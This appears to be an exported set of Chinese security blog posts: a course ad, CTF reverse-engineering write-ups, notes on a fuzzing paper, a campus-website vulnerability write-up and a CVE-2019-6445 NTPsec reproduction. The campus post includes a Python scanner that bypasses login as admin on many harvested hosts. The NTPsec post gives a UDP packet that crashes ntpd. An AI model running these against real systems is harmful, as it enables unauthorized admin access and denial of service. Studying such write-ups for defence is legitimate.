漏洞原理之命令执行&#x2F;注入漏洞 4.2 IoT 设备漏洞挖掘与实战 4.2.1 IoT 常见 Web 服务架构 4.2.2 IoT 设备 OTA 4.2.3 IoT 设备漏洞挖掘思路概述 4.2.4 IoT 命令注入漏洞复现 4.2.5 IoT 命令注入漏洞复现实操 4.2.5 IoT 认证绕过漏洞复现 4.2.6 IoT 缓冲区溢出漏洞复现 4.2.7 IoT 后门漏洞复现 4.3 Fuzz与物联网漏洞挖掘 4.3.1 IoT 与 Fuzzing 4.3.2 IOT 场景中的 Fuzzer 工具 4.3.3 常见 Fuzz 工具 AFL++ 介绍&amp;安装 4.3.4 常见 Fuzz 工具 AFL++ 实例演示 4.3.5 常见 Fuzz 工具 Boofuzz 介绍与安装 4.3.6 常见 Fuzz 工具 Boofuzz 实例演示 4.3.7 LLM 助力物联网 Fuzzing 五、实战分析 5.1 路由器公开CVE分析实战 路由设备漏洞分析 路由设备漏洞分析之D-Link 路由设备漏洞分析之Tenda 路由设备漏洞分析之WayOS 路由设备漏洞分析之NETGEAR 路由设备漏洞分析之Belkin 路由设备漏洞分析之UTT 5.2 其他设备 物联网设备漏洞分析 南方测绘等GNSS设备漏洞分析 5.3 拓展篇 实战物联网设备信息收集 自动化工具固件初步分析 六、物联网安全走向何处？ 6.1 国内外安全社群简介 6.2 安全研究方向简介 6.3 车联网&#x2F;卫星&#x2F;LLM简介 上下滑动查看 🚀 抓住机遇，成为IoT安全领域的先行者 在IoT安全领域，知识和技能就是你的竞争力。《系统0day安全-IOT设备漏洞挖掘（第6期）》课程，是你提升自我、抢占先机的利器。 现在报名，你将获得： - 顶尖讲师的一对一指导 - 实战经验的直接传授 - 从理论到实践的全方位学习体验 - 一个充满活力的学习社群，与你共同进步 🌈 限时优惠，不容错过 原价¥20000 现价¥15000 [立即报名，开启IoT安全之旅] 探索IoT设备的奥秘 🌟 课程咨询 **** 📢 报名加入，让安全不再是难题","categories":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/categories/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"}],"tags":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/tags/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"}],"author":"SecureNexusLab"},{"title":"PolarCTF[RE][easy]全解(下)","slug":"PolarCTF[RE][easy]全解(下)","date":"2024-10-20T16:00:00.000Z","updated":"2025-07-16T02:14:23.061Z","comments":true,"path":"2024/10/21/PolarCTF[RE][easy]全解(下)/","permalink":"http://example.com/2024/10/21/PolarCTF[RE][easy]%E5%85%A8%E8%A7%A3(%E4%B8%8B)/","excerpt":"","text":"引言 本次分享PolarCTF靶场中所有[easy]re题目的WP。 由于文章篇幅较长（一共有22道题目），分为两期发表，本期书接前文，分享下半部分内容，适合刚接触逆向的朋友。如果你也对逆向感兴趣，或者正在准备CTF比赛，希望这些内容能给大家一些帮助。 PolarCTF[C^] 64位ELF，直接运行：关键字符串“Please enter flag” IDA启动！ fun1()：a1[i] ^= 1u check()用于判断a1是否和s相等：s = shfiu777 所以flag = shfiu777 ^ 1u 12345678910111213#include &lt;stdio.h&gt;int main() &#123; char flag[] = &quot;shfiu777&quot;; for (int i = 0; i &lt; 8; i++) &#123; flag[i] ^= 0x1u; &#125; printf(&quot;%s&quot;, flag); return 0;&#125; 再md5，32位小写加密即可 PolarCTF[babyRE] 64位exe。运行以后发现，随便输入会输出“Err” 看眼endoce()：对flag的每位+2 那flag是啥嘞：shift+f12里有一串诡异字符。可以试试 1234567891011121314#include &lt;stdio.h&gt;#include &lt;string.h&gt; // Fixed from `&lt;string&gt;` to `&lt;string.h&gt;`int main() &#123; char flag[] = &quot;asdfgcvbnmjgtlop&quot;; for (int i = 0; i &lt; strlen(flag); i++) &#123; flag[i] += 2; &#125; printf(&quot;%s&quot;, flag); return 0;&#125; PolarCTF[easyre1] 64位ELF。运行发现：会输出”no no no” IDA启动！ 挨个看吧。 enkey()：循环32次，134520896 + 96 &#x3D; 134520992 看看这俩内容都是啥： 134520896: key = 5055045045055045055045055045055 134520992: flag的位置 所以enkey()就是让flag和key按位异或。 ‍ reduce()：循环31次，flag每位都-1 check()：对比flag和d^XSAozQPU^WOBU[VQOATZSE@AZZVOF ‍ 反过来就是： d^XSAozQPU^WOBU[VQOATZSE@AZZVOF每位都+1 然后和key按位异或 12345678910111213141516#include &lt;stdio.h&gt;#include &lt;string.h&gt; // Fixed from &lt;string&gt; to &lt;string.h&gt; for strlen()int main() &#123; char flag[] = &quot;d^XSAozQPU^WOBU[VQOATZSE@AZZVOF&quot;; char key[] = &quot;5055045045055045055045055045055&quot;; for (int i = 0; i &lt; strlen(flag); i++) &#123; flag[i]++; flag[i] ^= key[i]; &#125; printf(&quot;%s&quot;, flag); return 0;&#125; ​ PolarCTF[Sign Up] 64位exe。直接运行发现关键字符串。 IDA启动！ 非常eazy啊，key_num[i]-1 = name; key_password[i]-2 = password key_num = 192168109; key_password = root 12345678910111213141516171819202122#include &lt;stdio.h&gt;#include &lt;string.h&gt; // Changed from &lt;string&gt; to &lt;string.h&gt; for strlen()int main() &#123; char key_num[] = &quot;192168109&quot;; char key_password[] = &quot;root&quot;; // Process key_num (decrement each character by 1) for (int i = 0; i &lt; strlen(key_num); i++) &#123; key_num[i]--; &#125; // Process key_password (decrement each character by 2) for (int i = 0; i &lt; strlen(key_password); i++) &#123; key_password[i] -= 2; &#125; printf(&quot;name = %s\\n&quot;, key_num); printf(&quot;password = %s\\n&quot;, key_password); return 0;&#125; 检验一下： 拼接起来md5即可。 等等，不对？ 原来是眼睛不好使，没注意人家只替换了7个数 12345678910111213141516171819202122#include &lt;stdio.h&gt;#include &lt;string.h&gt; // Correct header for strlen()int main() &#123; char key_num[] = &quot;192168109&quot;; char key_password[] = &quot;root&quot;; // Process first 7 characters of key_num (decrement by 1) for (int i = 0; i &lt;= 6; i++) &#123; key_num[i]--; &#125; // Process all 4 characters of key_password (decrement by 2) for (int i = 0; i &lt;= 3; i++) &#123; key_password[i] -= 2; &#125; printf(&quot;name = %s\\n&quot;, key_num); printf(&quot;password = %s\\n&quot;, key_password); return 0;&#125; 这下对了！ PolarCTF[? 64] 64位可执行。 这，我猜是base64，直接在线解密试试： 赢！但是还是看看程序 遗憾！并不是base64的加密程序QAQ。收工 PolarCTF[Why32] 64位exe 这几个函数连起来的意思就是：input.len == 32 继续看Do()函数：input = cAry[i]-2; cAry = &quot;2gfe8c8c4cde574f7:c6c;:;3;7;2gf:&quot; 1234567891011121314#include &lt;stdio.h&gt;#include &lt;string.h&gt; // Changed from &lt;string&gt; to &lt;string.h&gt;int main() &#123; char key_num[] = &quot;2gfe8c8c4cde574f7:c6c;:;3;7;2gf:&quot;; // Process each character (subtract 2 from ASCII value) for (int i = 0; i &lt;= 31; i++) &#123; key_num[i] -= 2; &#125; printf(&quot;%s\\n&quot;, key_num); return 0;&#125; 这个half right是什么意思呢？ 不管了先直接包裹上flag提交试试，比较这个看起来很像md5加密之后的值。 ‍ 豪德，不对。 解密试试呢？ F1laig。这下对了！ ‍ PolarCTF[康师傅] 32位exe。IDA直接跟进main函数 input[i] ^= 9u == str1[i] 太简单了哇！直接str1[i] ^= 9u就是flag了 1234567891011121314#include &lt;stdio.h&gt;#include &lt;string.h&gt; // Changed from &lt;string&gt; to &lt;string.h&gt; for strlen()int main() &#123; char flag[] = &quot;oehnr8&gt;?;&lt;?:9k&gt;09;hj00o&gt;:&lt;o?8lh;8h9l;t&quot;; // XOR each character with 9 for (int i = 0; i &lt; strlen(flag); i++) &#123; flag[i] ^= 9u; &#125; printf(&quot;%s\\n&quot;, flag); return 0;&#125; PolarCTF[re2] 64位ELF，IDA直接启动。 PolarCTF[layout] 下载下来发现是apk。安装到雷电模拟器里看看。 疑似没做竖屏适配。调设置重启一下，发现还是乱码。 OK！上手段——jadx打开，直接搜索flag&#123; 不对？！ 好吧。回到雷电模拟器，用开发者助手提取： 这下对了 ‍ PolarCTF[use\\_jadx\\_open\\_it] 这个名字——我听话，用 jadx 直接打开，然后搜索字符串： 结束 ‍ 【未完成】****PolarCTF[另辟蹊径] 32位exe。但是注意：Section是乱码。丢进虚拟机里运行发现果然运行不了。 拽进ida里发现会创建一个新文件，感觉不对。 然后搜了一下writeup，好像这个文件有毒。暂停解题 PolarCTF[JunkCode] 32位可执行文件。IDA没看出名堂，进x64dbg试试。 根据题目名，猜测有很多无用代码，所以直接搜索字符串找到关键代码部分 简单分析（内容写注释里了）： 分析认为junkcode.1F1258是判断函数： 调用该函数后，有个jump，一个会输出funny（疑似成功？），一个会输出”no”。 运行测试时，发现输错 flag 就会输出”no” ‍ 下断点准备跟进去看，结果发现eax里就是flag~ END本文作者：白玉京","categories":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/categories/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"}],"tags":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/tags/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"},{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"}],"author":"白玉京"},{"title":"Fuzz测试之变异模糊测试","slug":"fuzz-testing-2024","date":"2024-10-20T16:00:00.000Z","updated":"2025-07-15T13:57:36.167Z","comments":true,"path":"2024/10/21/fuzz-testing-2024/","permalink":"http://example.com/2024/10/21/fuzz-testing-2024/","excerpt":"","text":"SHAPFUZZ: Efficient Fuzzing via Shapley-Guided ByteSelection Abstract 基于变异的模糊测试是一种流行且有效的技术，用于发现程序中的漏洞和未覆盖代码。然而，只有少数研究关注量化输入字节的重要性。每个输入字节的重要性由其在发现新代码中的贡献程度决定。以前的工作往往集中于获取输入字节与路径约束之间的关系，而忽略了并非所有与约束相关的字节都能发现新代码的事实。 在本文中，作者进行Shapley分析来理解字节位置对模糊测试性能的影响，发现某些字节位置比其他字节位置贡献更大，并且这种特性通常在不同的种子之间保持一致。 基于此观察结果，我们提出了一种新颖的解决方案，成为SHAPFUZZ，以指导模糊测试过程中的字节选择变异。具体而言SHAPFUZZ在模糊测试期间每次测试输入时，以低开销更新字节的Shapley值（重要性）。它利用上下文多臂老虎机（CMAB）算法在变异高Shapley值字节和和低频选择字节之间进行权衡。 作者基于AFL++实现该解决方案的原型，即SHAPFUZZ，并针对包括五个字节调度Fuzzer和五个常用的Fuzzer在内的十个最先进的模糊器对其进行评估。与字节调度模糊器相比，SHAPFUZZ发现了更多边。它还在三组不同的初始种子集上暴露了比最佳基线更多的漏洞。SHAPFUZZ比最佳常用的模糊器多暴露20个漏洞，并且在MAGMA上比基线多发现6个CVE。此外，SHAPFUZZ在6个广泛使用的程序的最新版本上发现了11个新漏洞，其中3个漏洞已得到供应商的确认。 Introduction 基于变异的模糊测试，核心是：变异哪些字节？ 这些字节该用什么值？ 作者将Shapley值法应用于模糊测试的havoc变异阶段，指导应当变异哪些字节组合。 在确定变异字节的方向中，先前已有的研究： TaintScope&#x2F;Dowser&#x2F;Angora依赖于额外的分析(污点分析)来识别与路径约束相关的字节 GREYONE&#x2F;REDQUEEN&#x2F;ProFuzzer&#x2F;PATA间接推断字节和约束之间的依赖关系 NEUZZ&#x2F;MTFuzz&#x2F;EMS从历史数据中提取信息来找到变异的位置 现有研究不足之处 前文所提及的解决方案中平等地对待所有与约束相关的字节 ，在无法发现新代码的字节上浪费时间和能量。 现有的解决方案所需的额外分析阶段通常由于其逐字节调查而非常耗时，代价较高 。 对于基于深度学习 的Fuzzer，这个额外的分析阶段甚至可能导致模糊测试过程失败，因为构建模型时，输入尺寸过大 会导致内存不足。 解决方案 作者的关键思路是量化与约束相关字节的重要性，而不需要额外的分析阶段。新区域的发现是由于某些字节的合作，准确来说是它们协作变异的结果。作者从合作博弈论的角度出发，将模糊测试的字节调度部分视为ShapleyAnalysis的“过程”。 过程：作者在Fuzzing中应用Shapley分析，通过计算字节组合中每个字节的边际贡献 ShapleyAnalysis被广泛用于量化每个参与者对结果的贡献。通过量化输入字节的重要性，可以找到更有可能发现新代码的字节，并在这些字节上进行更多的变异尝试。ShapleyAnalysis可以集成到变异过程中，因此不需要额外的分析阶段来获得字节的重要性。 Shapley Analysis 在合作博弈论中，玩家联盟共同参与游戏并获得收益。关键问题是每个玩家对联盟的贡献程度。为了解决这个问题，人们提出了许多方法。其中最著名的解决方案是Shapley值，这是一种在合作博弈中分配收益的方法。具体来说，Shapley值是每个玩家对所有可能的玩家联盟的边际贡献的加权平均值。此外，Shapley值已应用于许多领域，例如量化深度学习模型中特征的重要性。简单来说，就是一个由玩家组成的联盟参加一场游戏获得收益，那么如何分配收益才是公平的？Shapley值用来解决这个公平分配问题。 本文的核心在于Shapley值法的应用。重要的就是计算每个玩家的边际贡献。如图，举例说明： 现在假设Tom每小时能挣10美元，Mike每小时能挣20美元，他们一起作为一个联盟每小时能挣40美元。那么现在便有个问题，该如何分配这40美元？平均分配显然对Mike来说不公平。通过Shapley值法，先计算各自的边际贡献。A的边际贡献即是A给联盟其他人带来的价值。那么对Tom来说，Mike的边际贡献就是40-10&#x3D;30。对Mike来说，Tom的边际贡献就是40-20&#x3D;20。根据Shapley值法，Tom应该获得的收益为(10+20)&#x2F;2&#x3D; 15$，Mike应该获得的收益为(20+30)&#x2F;2&#x3D;25$。 在模糊测试中的变异阶段，fuzzer会将选择好的种子进行变异，fuzzer的变异算子会改变某个随机字节或比特位的值（例如，位翻转，字节算术加减随机数等）。变异代价相对执行而言小很多，因此通常对一个种子变异多次，这会形成该次变异的字节组合。具体而言，作者将一次变异中值发生改变的字节作为一个字节组合。将每个字节组合作为一个联盟，每个字节作为一个玩家，发现新区域（新边）的数量作为收益R，来计算每个字节的临时Shapley****值以指导下一次变异该选择哪些字节进行变异。 Motivation 由于字节是协同变异以探索代码的，因此作者使用Shapley值的方法来分析字节的贡献。作者首先通过以下两个观察实验来确定字节具有不同的重要性 Experiment of Shapley Analysis 为了计算种子中字节的Shapley Value,作者将一个组合发现的新边数量视为收益。然而，一个长度为N的种子有256^N种可能的组合，数量过多无法进行测试。为获得字节的相对准确的ShapleyValue，作者对单个种子进行48小时的随机变异模糊测试。 观察实验一 ： 使用AFL++对18个程序进行模糊测试。一个程序的corpus只存在一个种子，且不更新种子队列。即持续地变异（移除改变种子长度的变异器 ）所选的初始种子。重复实验六次。 * 期间，执行恢复策略。即&#123;1,3,4&#125;字节组合发现新边收益为R0，那么将执行其所有子集，得到收益R1~Rn，共同计算各个字节的Shapley值。（为了与Shapley值法的定义保持一致） * 实验结果如下： 每个点表示对于一个程序和一个初始种子，前 X% 的字节贡献了 Y% 的新边。由实验结果可知，一小部分字节对发现新边的贡献最大。 观察实验二 ： 使用GreyOne的FTI方法分析16个程序中CMP之间相关字节的重叠情况。即，给定一个CMP和种子，如果改变种子的第i个字节会导致CMP j的值发生改变，那么字节i与CMP j相关。实验结果如下图所示： 大多数字节与多个CMP指令相关。这个实验表明，CMP之间相关字节的共享是一种普遍现象。换句话说，少部分字节与多个路径约束相关 。 通过观察实验，作者发现，只有少部分字节对探索新区域贡献最大，因此可以利用Shapley分析来获取这些高重要性字节，并在模糊测试期间分配更多能量给它们。由于与约束相关的字节通常与多个CMP指令相关，因此专注于高重要性字节可以提高在未见路径中发现代码的效率。 Design SHAPFUZZ专注于字节变异，量化字节位置的重要性。将相同长度的种子理解为一个Shapley分析过程。即，从同一个原始种子保留下来且不改变长度的种子属于同一个合作博弈，并且共享相同的字节ShapleyValue。为了将Shapley Analysis融入到Fuzzing中，作者提出以下设计方案。 Shapley Analysis Among Bytes ShapleyAnalysis，前文提过。指玩家联盟共同参与游戏并获得收益，假设联盟S在游戏中获得的收益为R，根据每个玩家的贡献程度来分配收益。Shapley值法能够量化每个玩家的贡献程度，因此合理分配联盟收益。 * 一个长度为N的种子，有N个字节。将每个字节作为玩家，即有N个玩家。一次完整的Shapley分析会将2^N种组合的收益都计算得出。每一个字节组合（一次变异中的所有发生变化的字节组成）都作为一个联盟。每一个联盟的收益都会被算出。放在模糊测试中，每一个字节组合&#123;x_1,x_2,...,x_i&#125;都应该被变异执行一次，以获得收益（发现新边的数量）。 Shapley Analysis In One Seed 如果收益定为一次Fuzzing结束后新发现边的数量，由于新发现的边是通过与当前覆盖状态进行比较获得的，那么同样的字节组合在不同的时间执行相同的变异发现新边的数量是不同的。举例来说，在Fuzzing初期字节组合{1,3,4}变异并执行结束后会得到一个位图，与全局位图进行比较以确定是否发现新边。随着Fuzzing的进行，全局位图在不同时间有不同状态，所以在另一时间该字节组合以相同变异并执行得到的位图虽然没有变化，但是全局位图发生了变化，相比较所得到的新边数量就会发生变化。 因此，作者将收益R定义为自新边(self-new edges) 的数量，作者定义自新边为将输入i发现的边与初始种子S0****发现的边进行比较时发现的新边 。也就是说，每个组合变异执行得到的位图不与全局位图进行比较，而是与初始种子的位图进行比较。 Shapley Analysis Across Seeds 从Shapley分析的角度看，多个种子可以被视为一个种子。如果变异没有改变原始种子S0的长度，该变异得到的新种子S1实际上就是种子S0的Shapley分析的一个组合。因此，可以将长度相同的种子视作一个家族(family)。那么”family”会有以下特征： * 家族中所有种子都由初始种子变异而来 * 所有种子具有相同的长度。 * 每个种子的字节位置一致，因此每个字节Shapley值在每个种子中是一致的 执行Shapley Analysis的过程会产生新的种子，如果新种子长度没有变化，那么其实际上就是原始种子ShapleyAnalysisi的一个字节组合。如果长度发生变化，则字节的相对位置，以及ShapleyAnalysis中的玩家数量发生了变化。针对于Fuzzing过程中长度发生变化的种子，作者采取以下措施： * 针对于改变长度的变异操作，将这些操作存储至M1中。 * 若改变长度的种子未发现“新边”（not self-new edges），那么不保存，抛弃即可。（遵循遗传算法） * 若改变长度的种子发现了“新边”，则利用M1撤销长度变异操作。再次执行。 * 倘若能够发现相同的“新边”，那么则将撤销长度变异操作后的新种子加入其初始种子的family中。 * 倘若不能够发现相同的“新边”，那么将改变长度的新种子作为初始种子加入一个新的family 该过程如下图所示： Shapley值的更新可以嵌入到Fuzzing的变异阶段。变异产生的未改变长度的测试实例都是一个Shapley分析中的字节组合。该测试实例执行后，都可以根据执行结果计算收益R。利用这个收益R更新字节的Shapley值。但是更新期间，应该只针对与约束条件相关的字节。换句话说，只更新与约束条件相关字节的Shapley值。那么，在某次字节变异组合{1,3,4}执行后发现了自新边。需要精简该字节变异组合，筛选出其中的必要字节。即，分别执行{1,3},{1,4},{3,4}。倘若{1,3}的执行结果与{1,3,4}的结果相同，那么字节{4}便是冗余字节。此次Shapley值更新将排除字节{4}。 更新过程中，需要计算每个字节Shapley值，也就是每个字节对字节组合的边际贡献。根据Shapley值法的计算方式，需要获得所有子集的收益R，上述例子中必要字节组合{1,3}的值更新过程中，会执行{1},{3}获得其收益R1和R3以计算字节{1},{3}对联盟{1,3}的边际贡献。 在代码实现中，字节的Shapley值&#x3D;自新边数量&#x2F;必要字节数量。且每个必要字节的Shapley值相同。（如果严格按照Shapley值法定义来计算，在Fuzzing期间应该恢复字节组合的子集并执行。这样效率就过低，且计算出的Shapley值仍然是一个不完整的。） 随着Fuzzing的进行，每个家族的字节Shapley值会不断更新。仅根据当前计算得到的字节Shapley值来选取需要变异的字节是不够的，因为，Shapley值的计算仅基于输入空间的一部分得到，它不能保证具有高Shapley值的字节总是保持高值。所以，当Fuzzing过程中，一些字节因为高Shapley值被频繁选中但未发现新边时，便不能在这些字节上浪费更多能量。所以需要在高Shapley值和低频选择字节 之间平衡。 Shapley-guided Byte Selection ShapFuzz使用上下文多臂老虎机（CMAB）来实现Shapley值的权衡。而作者所采取的求解算法为最大置信区间上界算法（Upper ConfidenceBound），置信区间是概率统计和统计推断比较重要的概念，其衡量一个随机变量分布的置信水平。置信区间越大，越说明这个随机变量不确定因素更大。UCB则是采用置信水平来实现对Exploitation和Exploration之间的平衡。 利用Shapley值，为字节选择构建概率分布，即CMAB为每个字节计算分数。分数越高的字节被选择的概率越高。 * 其中r_&#123;s,p&#125;是该输入所执行路径的稀有性。 * 在代码中实现的方案 * * * * * // before havoc mutation stage.// centers had been generated.for(u32 i = 0;i &lt; afl-&gt;centers_num;i++)&#123; // distance: between ancestor seed path and every center path. double distance = (double)cal_distance(cur, afl-&gt;centers[i], map_size); // input-&gt;feature_vec-&gt;data is the cosine similarity of every center. afl-&gt;queue_cur-&gt;feature_vec-&gt;data[i] = distance;&#125;// every_score: one byte of mutation.every_score = r1-&gt;data[0] + m3 + ancestor_node-&gt;mutated_pos[ii].SV;// ...score = sum(every_score);// generate a random number between 0 and score.double choose = ((double)rand()/RAND_MAX) * score;// history_mutation_sequence_idx is the quantity of mutations bytes for(u32 i = 0;i &lt; afl-&gt;history_mutation_sequence_idx;i++)&#123; // find first byte greater than choose if(afl-&gt;distribution[i] &gt;= choose)&#123; return afl-&gt;history_mutation_sequence[i]; &#125;&#125;// else return random one position f_s存储于feature_vec中。A被初始化为k × k，对角线全为1的矩阵。b被初始化为k × 1，全为0的矩阵。其中A矩阵的更新方式为 。B矩阵的更新方式为 ,其中R为收益。 作者提出的一些局限性 Shapley值计算的开销：Shapley将字节变异的过程建模为一个合作博弈，并使用Shapley分析来量化每个字节的贡献。假设在一个变异中发现了自新边，并且其变异位置的数量为N。为了计算Shapley值，我们需要分析在个变异位置子集中发现的自新边数量。为了降低开销，SHAPFUZZ使用两种特殊情况来简化Shapley分析过程。首先，如果存在不影响自新边结果的冗余字节，我们移除这些字节以减少N。其次，如果变异字节是发现自新边所必须的，那么这些字节具有相同的Shapley值。然而，如果这两个条件都不满足并且N很大，就会引入一些开销。将来，我们可以使用轻量级和改进的Shapley分析算法来缓解这个问题。 可变种子长度 ：此外，SHAPFUZZ建立了一个族系系统来减轻Shapley分析带来的开销。在一个族系中，同一族系的种子对于字节具有相同的Shapley值。然而，在维护族系时，我们忽略了改变长度的变异输入。这是因为使用改变种子长度的变异器可能会扰乱种子种的字节位置，我们无法实现种子间的位置映射。将来，我们可以研究可变长度Shapley分析的数学理论。在现有版本中，如果通过改变长度生成一个新的种子，我们将使用这个种子创建一个族系来缓解这个问题。 自新边影响 ：随着时间的推移，新边发现变得越来越困难，SHAPFUZZ 利用自新边作为衡量收益和识别可能影响多个分支的字节的指标。然而，在某些情况下，导致自新边的字节并不一定会导致发现额外的新的边。这些自新边可能已经被其他种子发现。因此，具有高沙普利值的字节实际上可能比沙普利值所指示的贡献更少。如果我们为这些字节分配了过多的能量，会导致模糊效率下降。例如，假设种子中的字节 i 与 y 条边相关联。如果所有这 y 条边都被探索过，我们可以推断字节 i 已经做出了重大贡献。然而，由于与字节 i 相关的所有边都被探索过，为字节 i 分配任何能量都不会帮助发现新的边。 族系内部语义一致性 ：为了减少计算沙普利值的开销，同一个族系中的种子共享相同的Shapley值。然而，尽管实施了严格的族系构建方法（具有遗传关系和相同长度的种子），但仍然可能存在种子之间语义不一致的情况。语义不一致会导致具有不同含义的字节共享相同的沙普利值，从而错误地估计字节的重要性。例如，长度字段通常可以决定后续字节的语义。在这种情况下，我们的方法无法保证种子之间的语义一致性。 假设存在一个种子 A，其中字节 i 是一个长度字段。种子 B 是通过变异字节 i 从种子 A 派生出来的。由于长度字段的改变直接改变了后续字节的含义，因此字节 j（紧随字节 i，位于种子 A 和种子 B 中的相同位置）很可能具有不同的含义。这意味着即使种子 A 和种子 B 具有相同的长度和遗传关系，种子 A 和种子 B 中的字节 j 在语义上也不一致。如果我们继续在这两个种子中共享字节 j 的沙普利值，就会导致Shapley值不准确，使一些低效的字节被分配到更高的变异能量，从而影响模糊效率。 Questions &amp;Ideas 以自新边为收益R，但是代码中的原始种子的virgin_bits会改变。那这跟文章中自新边的定义便冲突了。同一变异还是会获得不同收益。 Shapley值计算方式效率很高，但可能指导价值就不够大。 每个字节的Shapley值更新方式: self-new edges &#x2F; necessary bytes 并且，每一次变异执行后都会累加。那么字节的Shapley值实质就是，这个字节从Fuzzing开始至现在发现自新边的能力。而自新边的定义在代码中又被修改成”family”中全局的virgin_bits。那么针对同一个**”family”**而言，就是给历史发现“新边”数量越多的字节分配更多的能量。 再根据多臂老虎机，在能量低次数少与能量高次数高的字节间平衡。所以，这个Shapley值法的应用，笔者认为是作者为了发论文所附加上的，代码也应可以简化。 以下是笔者一些ideas，当然建立于Shapley值能够很好应用于Fuzzing的前提下。 针对文章提出的语义一致性问题，可以使用Pit文件来指导变异。针对一些会改变种子语义的字段变异，便不适用Shapley值或使用一个较低的值。等待CMAB选中这些特殊语义字段时，再决定如何变异。（参考Peach fuzzer） 可以尝试在AFL++上实现一个基于字节历史表现来分配变异能量,并利用CMAB来平衡低次数字节与高次数字节的策略。并看看和SHAPFUZZ的效率差异。","categories":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/categories/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"}],"tags":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/tags/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"},{"name":"二进制安全","slug":"二进制安全","permalink":"http://example.com/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"}],"author":"SecureNexusLab"},{"title":"记一次校园网站漏洞通杀","slug":"edu-vuln-mining-record","date":"2024-10-08T10:45:00.000Z","updated":"2025-07-15T12:45:27.627Z","comments":true,"path":"2024/10/08/edu-vuln-mining-record/","permalink":"http://example.com/2024/10/08/edu-vuln-mining-record/","excerpt":"","text":"01 漏洞挖掘Part.01逻辑缺陷 熟悉的页面，熟悉的弱口令测试，但无果我就把目光转向js审计，果不其然有新发现，可以根据账号自动登录于是直接构造请求绕过登录经典的管理员权限 Part.02存储型xss寻找文本输入浅析： 前端：这里的标签都是普通标签，没有像RCDATA元素(RCDATA elements)，有和，会做一次HTML编码，所以可以直接插入危险的js代码。 后端：没有任何过滤（笑~ 所以就简单了，直接插入alert('1')即可 Part.03SQL注入测试无果最后发现注入点在第一个函数，果然任何一个输入点都是不安全的，是布尔型盲注后面就是经典Sqlmap了 02 继续通杀根据系统指纹在fofa上搜索：”xx系统” &amp;&amp; icon_hash&#x3D;”11xxxx” 有32个IP，看了下，有重复的使用fofa_viewer导出目标 这里我根据第一个逻辑漏洞的漏洞指纹信息，写了一个poc 123456789101112131415161718import requestsdef poc(url): poc_url = url + &#x27;/login/doautologin.edu&#x27; data = &#123;&#x27;um.userid&#x27;: &quot;admin&quot;&#125; try: res = requests.post(poc_url, data=data, timeout=5) if (res.headers.get(&quot;Set-Cookie&quot;)): # 登录成功就会set-cookie print(url + &#x27;/login.html&#x27;) except BaseException: passif __name__ == &#x27;__main__&#x27;: with open(&#x27;url.txt&#x27;, &#x27;r&#x27;) as f: for i in f: poc(i.rstrip(&#x27;\\n&#x27;)) 03 思考总结**01.**在访问系统当中的时候F12查看源码是一个不错的习惯（尤其是有前端弹框的） **02.**前端代码的一切展示行为完全可控(一定要理解这句话) **03.**了解程序的底层逻辑，你才能更清晰的知道每一个参数的意义","categories":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/categories/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"}],"tags":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/tags/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"},{"name":"Web安全","slug":"Web安全","permalink":"http://example.com/tags/Web%E5%AE%89%E5%85%A8/"}]},{"title":"怎样才算复现一个CVE？CVE-2019-6445 NTPsec逆向空指针利用","slug":"cve-2019-6445-NTPsec-exploit","date":"2024-09-27T00:02:00.000Z","updated":"2025-07-15T12:45:43.151Z","comments":true,"path":"2024/09/27/cve-2019-6445-NTPsec-exploit/","permalink":"http://example.com/2024/09/27/cve-2019-6445-NTPsec-exploit/","excerpt":"","text":"怎样才算复现一个CVE？CVE-2019-6445 NTPsec逆向空指针利用 软件介绍NTPsec是一个基于网络时间协议（Network Time Protocol，NTP）的开源时间同步软件项目。它是对传统的NTP软件的重新实现，旨在提供更高的安全性、可靠性和性能。 NTP是用于在计算机网络中同步时钟的协议，它允许计算机通过网络获取准确的时间信息。传统的NTP实现存在一些安全和可靠性方面的问题，例如容易受到网络攻击和时间信息伪造。NTPsec项目致力于解决这些问题，并改进NTP软件的功能。 NTPsec项目的目标是提供一个更安全、更现代化、更易于维护的NTP实现。它采用了更严格的代码审查和安全措施，修复了安全漏洞，并改进了协议的可靠性和性能。NTPsec还通过支持新的网络安全特性，如Network Time Security（NTS），提供了更强大的安全保护。 NTPsec的开发始于2014年，由一群志愿者开发者组成的团队共同推动。该项目是开源的，遵循自由软件许可证（类似于BSD许可证）。它在Linux、Unix和类似系统上可用，并广泛用于服务器、网络设备和其他需要准确时间同步的系统中。 漏洞描述NTPsec是一个网络时间协议的实现。 NTPsec 1.1.3之前版本中的ntp_control.c文件存在空指针逆向引用漏洞。攻击者可利用该漏洞造成tpd崩溃。 漏洞原因poc：https://github.com/snappyJack/CVE-2019-8936/ 源码：https://github.com/ntpsec/ntpsec/releases/tag/NTPsec_1_1_2 POC12345678910111213\\#!/usr/bin/env python \\# note this PoC exploit uses keyid 1, password: gurka import sys import socket buf = (&quot;\\x16\\x03\\x00\\x03\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x6c\\x65\\x61\\x70&quot; + &quot;\\x00\\x00\\x00\\x01\\x5c\\xb7\\x3c\\xdc\\x9f\\x5c\\x1e\\x6a\\xc5\\x9b\\xdf\\xf5&quot; + &quot;\\x56\\xc8\\x07\\xd4&quot;) sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) sock.sendto(buf, (&#x27;127.0.0.1&#x27;, 123)) 